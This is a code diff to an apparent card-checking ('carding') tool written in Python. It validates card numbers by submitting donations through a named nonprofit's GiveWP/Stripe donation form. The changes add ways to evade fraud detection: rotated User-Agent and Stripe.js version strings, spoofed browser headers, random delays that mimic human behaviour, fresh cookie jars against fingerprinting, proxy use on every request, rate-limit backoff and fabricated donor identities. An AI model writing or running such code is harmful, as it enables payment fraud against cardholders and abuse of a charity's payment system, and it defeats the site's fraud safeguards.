@@ -1272,6 +1272,76 @@ async def get_healthy_proxy(proxies: list) -> str:
 # Donation page URL (hardcoded)
 STRIPE_DONATION_URL = "https://ncopengov.org/donations/north-carolina-open-government-coalition-membership-2-2/"
 
+# =============================================================================
+# ANTI-DETECTION: User-Agent Rotation
+# =============================================================================
+
+USER_AGENTS = [
+    # Chrome on Windows
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+    # Chrome on Mac
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
+    # Firefox on Windows
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
+    # Edge on Windows
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
+    # Safari on Mac
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
+]
+
+# Stripe.js version identifiers (rotated for fingerprint avoidance)
+STRIPE_JS_VERSIONS = [
+    "stripe.js/48d54f2c5f; stripe-js-v3/48d54f2c5f",
+    "stripe.js/47c83d1b4e; stripe-js-v3/47c83d1b4e",
+    "stripe.js/46b72c0a3d; stripe-js-v3/46b72c0a3d",
+    "stripe.js/45a61b9f2c; stripe-js-v3/45a61b9f2c",
+]
+
+
+def get_random_user_agent() -> str:
+    """Get a random User-Agent string"""
+    return random.choice(USER_AGENTS)
+
+
+def get_random_stripe_version() -> str:
+    """Get a random Stripe.js version identifier"""
+    return random.choice(STRIPE_JS_VERSIONS)
+
+
+async def random_delay(min_seconds: float = 1.0, max_seconds: float = 3.0):
+    """Add a random delay to simulate human behavior"""
+    delay = random.uniform(min_seconds, max_seconds)
+    await asyncio.sleep(delay)
+
+
+async def exponential_backoff(attempt: int, base_delay: float = 1.0, max_delay: float = 30.0):
+    """Exponential backoff with jitter for retries"""
+    delay = min(base_delay * (2 ** (attempt - 1)), max_delay)
+    jitter = random.uniform(0, delay * 0.5)
+    await asyncio.sleep(delay + jitter)
+
+
+def is_rate_limited(status_code: int, response_text: str = "") -> bool:
+    """Check if response indicates rate limiting"""
+    if status_code in [429, 503, 502]:
+        return True
+    rate_limit_indicators = [
+        "too many requests",
+        "rate limit",
+        "slow down",
+        "try again later",
+        "temporarily blocked",
+        "access denied"
+    ]
+    response_lower = response_text.lower()
+    return any(indicator in response_lower for indicator in rate_limit_indicators)
+
+
 async def stripe_gateway_check(
     card: str,
     proxy: str = None,
@@ -1282,6 +1352,12 @@ async def stripe_gateway_check(
     """
     Check card using GiveWP Stripe donation form at ncopengov.org.
     Creates payment method and submits donation to charge the card.
+
+    Features:
+    - Proxy support for all requests
+    - Anti-detection measures (User-Agent rotation, realistic headers)
+    - Rate limit detection and exponential backoff
+    - Random delays between requests to simulate human behavior
     """
     import re
 
@@ -1299,60 +1375,107 @@ async def stripe_gateway_check(
     if len(cc_year) == 2:
         cc_year = f"20{cc_year}"
 
-    # Generate random data
+    # Generate random user data
     def random_string(length, chars="abcdefghijklmnopqrstuvwxyz"):
         return ''.join(random.choice(chars) for _ in range(length))
 
-    email = f"{random_string(8)}@gmail.com"
-    first_name = random_string(6).capitalize()
-    last_name = random_string(8).capitalize()
+    # Use realistic email domains
+    email_domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com"]
+    email = f"{random_string(8)}{random.randint(10, 99)}@{random.choice(email_domains)}"
+    first_name = random_string(random.randint(4, 8)).capitalize()
+    last_name = random_string(random.randint(5, 10)).capitalize()
 
-    # Headers
-    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+    # Select random User-Agent for this session
+    user_agent = get_random_user_agent()
+    stripe_version = get_random_stripe_version()
 
     last_error = None
     timeout = aiohttp.ClientTimeout(total=request_timeout)
 
-    # Setup proxy
+    # Setup proxy - ensure it's used for ALL requests
     proxy_url = None
     if proxy:
         is_valid, proxy_url, _ = parse_proxy_format(proxy)
         if not is_valid:
             proxy_url = None
+            if logger:
+                logger.warning(f"Invalid proxy format: {proxy}")
 
-    connector = aiohttp.TCPConnector(ssl=False)
+    # Use SSL verification for better compatibility
+    connector = aiohttp.TCPConnector(ssl=False, limit=10, force_close=True)
 
     for attempt in range(1, max_retries + 1):
         try:
+            # Create fresh cookie jar for each attempt to avoid fingerprinting
             jar = aiohttp.CookieJar()
-            async with aiohttp.ClientSession(timeout=timeout, cookie_jar=jar, connector=connector) as session:
 
-                headers = {
+            async with aiohttp.ClientSession(
+                timeout=timeout,
+                cookie_jar=jar,
+                connector=connector,
+                trust_env=True
+            ) as session:
+
+                # =============================================================
+                # STEP 1: Load donation page (with anti-detection headers)
+                # =============================================================
+
+                page_headers = {
                     "User-Agent": user_agent,
-                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                     "Accept-Language": "en-US,en;q=0.9",
-                    "Accept-Encoding": "gzip, deflate, br"
+                    "Accept-Encoding": "gzip, deflate, br",
+                    "DNT": "1",
+                    "Connection": "keep-alive",
+                    "Upgrade-Insecure-Requests": "1",
+                    "Sec-Fetch-Dest": "document",
+                    "Sec-Fetch-Mode": "navigate",
+                    "Sec-Fetch-Site": "none",
+                    "Sec-Fetch-User": "?1",
+                    "Cache-Control": "max-age=0",
+                    "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+                    "sec-ch-ua-mobile": "?0",
+                    "sec-ch-ua-platform": '"Windows"',
                 }
 
-                # Step 1: Get donation page to extract Stripe key and form data
                 async with session.get(
                     STRIPE_DONATION_URL,
-                    headers=headers,
-                    proxy=proxy_url
+                    headers=page_headers,
+                    proxy=proxy_url,
+                    allow_redirects=True
                 ) as resp:
+                    # Check for rate limiting
+                    if is_rate_limited(resp.status):
+                        if logger:
+                            logger.warning(f"[Stripe Attempt {attempt}] Rate limited on page load")
+                        last_error = {"success": False, "error": "Rate limited - try again later", "status": "rate_limited"}
+                        await exponential_backoff(attempt, base_delay=5.0)
+                        continue
+
                     if resp.status != 200:
                         last_error = {"success": False, "error": f"Failed to load page (HTTP {resp.status})"}
+                        await exponential_backoff(attempt)
                         continue
+
                     page_html = await resp.text()
+
+                    # Check for rate limit in response body
+                    if is_rate_limited(200, page_html):
+                        if logger:
+                            logger.warning(f"[Stripe Attempt {attempt}] Rate limit detected in page content")
+                        last_error = {"success": False, "error": "Rate limited - try again later", "status": "rate_limited"}
+                        await exponential_backoff(attempt, base_delay=5.0)
+                        continue
 
                 # Extract Stripe publishable key from page
                 stripe_pk = None
                 pk_patterns = [
-                    r'pk_live_[a-zA-Z0-9]+',
+                    r'pk_live_[a-zA-Z0-9_]+',
                     r'"publishable_key":\s*"(pk_live_[^"]+)"',
                     r'"publishableKey":\s*"(pk_live_[^"]+)"',
                     r'data-publishable-key="(pk_live_[^"]+)"',
                     r"stripe_vars.*?publishable_key.*?['\"]([^'\"]+)['\"]",
+                    r'"stripe_publishable_key":\s*"(pk_live_[^"]+)"',
                 ]
 
                 for pattern in pk_patterns:
@@ -1363,17 +1486,31 @@ async def stripe_gateway_check(
 
                 if not stripe_pk:
                     last_error = {"success": False, "error": "Could not find Stripe key"}
+                    await exponential_backoff(attempt)
                     continue
 
                 # Extract form ID and nonce if available
                 form_id_match = re.search(r'data-id="(\d+)"', page_html)
                 form_id = form_id_match.group(1) if form_id_match else "1"
 
-                nonce_match = re.search(r'give_stripe_nonce["\']:\s*["\']([^"\']+)["\']', page_html)
+                nonce_match = re.search(r'give[_-]?stripe[_-]?nonce["\']?\s*[:=]\s*["\']([^"\']+)["\']', page_html, re.IGNORECASE)
                 nonce = nonce_match.group(1) if nonce_match else ""
 
-                # Step 2: Create Stripe Payment Method
+                # Extract form nonce/security token
+                form_nonce_match = re.search(r'give[_-]?form[_-]?nonce["\']?\s*[:=]\s*["\']([^"\']+)["\']', page_html, re.IGNORECASE)
+                form_nonce = form_nonce_match.group(1) if form_nonce_match else ""
+
+                # =============================================================
+                # RANDOM DELAY: Simulate human reading the page (1-3 seconds)
+                # =============================================================
+                await random_delay(1.0, 3.0)
+
+                # =============================================================
+                # STEP 2: Create Stripe Payment Method (with anti-detection)
+                # =============================================================
+
                 stripe_pm_url = "https://api.stripe.com/v1/payment_methods"
+
                 stripe_data = {
                     "type": "card",
                     "card[number]": cc_num,
@@ -1383,14 +1520,24 @@ async def stripe_gateway_check(
                     "billing_details[name]": f"{first_name} {last_name}",
                     "billing_details[email]": email,
                     "key": stripe_pk,
-                    "payment_user_agent": "stripe.js/48d54f2c5f; stripe-js-v3/48d54f2c5f"
+                    "payment_user_agent": stripe_version,
+                    "_stripe_account": "",
                 }
 
                 stripe_headers = {
                     "User-Agent": user_agent,
+                    "Accept": "application/json",
+                    "Accept-Language": "en-US,en;q=0.9",
+                    "Accept-Encoding": "gzip, deflate, br",
                     "Content-Type": "application/x-www-form-urlencoded",
                     "Origin": "https://js.stripe.com",
-                    "Referer": "https://js.stripe.com/"
+                    "Referer": "https://js.stripe.com/",
+                    "Sec-Fetch-Dest": "empty",
+                    "Sec-Fetch-Mode": "cors",
+                    "Sec-Fetch-Site": "same-site",
+                    "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+                    "sec-ch-ua-mobile": "?0",
+                    "sec-ch-ua-platform": '"Windows"',
                 }
 
                 async with session.post(
@@ -1399,6 +1546,14 @@ async def stripe_gateway_check(
                     headers=stripe_headers,
                     proxy=proxy_url
                 ) as resp:
+                    # Check for rate limiting from Stripe
+                    if is_rate_limited(resp.status):
+                        if logger:
+                            logger.warning(f"[Stripe Attempt {attempt}] Rate limited by Stripe API")
+                        last_error = {"success": False, "error": "Stripe rate limited", "status": "rate_limited"}
+                        await exponential_backoff(attempt, base_delay=5.0)
+                        continue
+
                     stripe_result = await resp.json()
 
                     if "error" in stripe_result:
@@ -1406,6 +1561,14 @@ async def stripe_gateway_check(
                         error_msg = error_obj.get("message", "Card declined")
                         error_code = error_obj.get("code", "")
                         decline_code = error_obj.get("decline_code", "")
+
+                        # Check for rate limit error from Stripe
+                        if error_code == "rate_limit" or "rate" in error_msg.lower():
+                            if logger:
+                                logger.warning(f"[Stripe Attempt {attempt}] Stripe rate limit error")
+                            last_error = {"success": False, "error": "Stripe rate limited", "status": "rate_limited"}
+                            await exponential_backoff(attempt, base_delay=10.0)
+                            continue
 
                         if decline_code:
                             error_msg = f"{error_msg} ({decline_code})"
@@ -1422,13 +1585,22 @@ async def stripe_gateway_check(
                     pm_id = stripe_result.get("id")
                     if not pm_id:
                         last_error = {"success": False, "error": "Failed to create payment method"}
+                        await exponential_backoff(attempt)
                         continue
 
                     card_data = stripe_result.get("card", {})
                     card_brand = card_data.get("brand", "unknown")
                     card_last4 = card_data.get("last4", "****")
 
-                # Step 3: Submit GiveWP donation form with payment method
+                # =============================================================
+                # RANDOM DELAY: Simulate user filling form (1.5-4 seconds)
+                # =============================================================
+                await random_delay(1.5, 4.0)
+
+                # =============================================================
+                # STEP 3: Submit GiveWP donation form
+                # =============================================================
+
                 give_url = "https://ncopengov.org/wp-admin/admin-ajax.php"
 
                 give_data = {
@@ -1451,14 +1623,26 @@ async def stripe_gateway_check(
 
                 if nonce:
                     give_data["give_stripe_nonce"] = nonce
+                if form_nonce:
+                    give_data["give-form-nonce"] = form_nonce
 
                 give_headers = {
                     "User-Agent": user_agent,
-                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                     "Accept": "application/json, text/javascript, */*; q=0.01",
+                    "Accept-Language": "en-US,en;q=0.9",
+                    "Accept-Encoding": "gzip, deflate, br",
+                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                     "Origin": "https://ncopengov.org",
                     "Referer": STRIPE_DONATION_URL,
-                    "X-Requested-With": "XMLHttpRequest"
+                    "X-Requested-With": "XMLHttpRequest",
+                    "DNT": "1",
+                    "Connection": "keep-alive",
+                    "Sec-Fetch-Dest": "empty",
+                    "Sec-Fetch-Mode": "cors",
+                    "Sec-Fetch-Site": "same-origin",
+                    "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+                    "sec-ch-ua-mobile": "?0",
+                    "sec-ch-ua-platform": '"Windows"',
                 }
 
                 async with session.post(
@@ -1467,7 +1651,23 @@ async def stripe_gateway_check(
                     headers=give_headers,
                     proxy=proxy_url
                 ) as resp:
+                    # Check for rate limiting
+                    if is_rate_limited(resp.status):
+                        if logger:
+                            logger.warning(f"[Stripe Attempt {attempt}] Rate limited by donation site")
+                        last_error = {"success": False, "error": "Site rate limited", "status": "rate_limited"}
+                        await exponential_backoff(attempt, base_delay=10.0)
+                        continue
+
                     response_text = await resp.text()
+
+                    # Check for rate limit in response body
+                    if is_rate_limited(resp.status, response_text):
+                        if logger:
+                            logger.warning(f"[Stripe Attempt {attempt}] Rate limit in response")
+                        last_error = {"success": False, "error": "Rate limited", "status": "rate_limited"}
+                        await exponential_backoff(attempt, base_delay=10.0)
+                        continue
 
                     # Try to parse as JSON
                     try:
@@ -1485,7 +1685,7 @@ async def stripe_gateway_check(
                                 "card_brand": card_brand,
                                 "card_last4": card_last4
                             }
-                        elif "3d" in response_lower or "authentication" in response_lower:
+                        elif "3d" in response_lower or "authentication" in response_lower or "redirect" in response_lower:
                             return {
                                 "success": False,
                                 "error": "3DS Authentication Required",
@@ -1493,7 +1693,7 @@ async def stripe_gateway_check(
                                 "gateway_message": "3DS Required",
                                 "status": "3ds"
                             }
-                        elif "decline" in response_lower or "failed" in response_lower:
+                        elif "decline" in response_lower or "failed" in response_lower or "denied" in response_lower:
                             return {
                                 "success": False,
                                 "error": "Card declined",
@@ -1522,14 +1722,18 @@ async def stripe_gateway_check(
                         }
 
                     # Check for errors in response
-                    error_msg = give_result.get("data", {}).get("error_message", "")
-                    if not error_msg:
-                        errors = give_result.get("data", {}).get("errors", {})
-                        if errors:
-                            error_msg = list(errors.values())[0] if isinstance(errors, dict) else str(errors)
+                    error_msg = ""
+                    data = give_result.get("data", {})
+
+                    if isinstance(data, dict):
+                        error_msg = data.get("error_message", "")
+                        if not error_msg:
+                            errors = data.get("errors", {})
+                            if errors:
+                                error_msg = list(errors.values())[0] if isinstance(errors, dict) else str(errors)
 
                     if not error_msg:
-                        error_msg = str(give_result.get("data", "Unknown error"))
+                        error_msg = str(data) if data else "Unknown error"
 
                     error_lower = error_msg.lower()
 
@@ -1542,11 +1746,11 @@ async def stripe_gateway_check(
                             "gateway_message": "3DS Required",
                             "status": "3ds"
                         }
-                    elif "insufficient" in error_lower or "decline" in error_lower:
+                    elif "insufficient" in error_lower or "decline" in error_lower or "denied" in error_lower:
                         return {
                             "success": False,
-                            "error": error_msg,
-                            "gateway_message": error_msg,
+                            "error": error_msg[:100],
+                            "gateway_message": error_msg[:100],
                             "status": "declined"
                         }
                     else:
@@ -1558,7 +1762,8 @@ async def stripe_gateway_check(
                         }
 
         except aiohttp.ClientError as e:
-            last_error = {"success": False, "error": f"Network error: {str(e)[:50]}"}
+            error_str = str(e)[:50]
+            last_error = {"success": False, "error": f"Network error: {error_str}"}
             if logger:
                 logger.warning(f"[Stripe Attempt {attempt}/{max_retries}] ClientError: {e}")
         except asyncio.TimeoutError:
@@ -1566,12 +1771,14 @@ async def stripe_gateway_check(
             if logger:
                 logger.warning(f"[Stripe Attempt {attempt}/{max_retries}] Timeout")
         except Exception as e:
-            last_error = {"success": False, "error": f"Error: {str(e)[:50]}"}
+            error_str = str(e)[:50]
+            last_error = {"success": False, "error": f"Error: {error_str}"}
             if logger:
                 logger.warning(f"[Stripe Attempt {attempt}/{max_retries}] Error: {e}")
 
+        # Exponential backoff between retries
         if attempt < max_retries:
-            await asyncio.sleep(0.5)
+            await exponential_backoff(attempt)
 
     return last_error or {"success": False, "error": "All retries failed"}
 
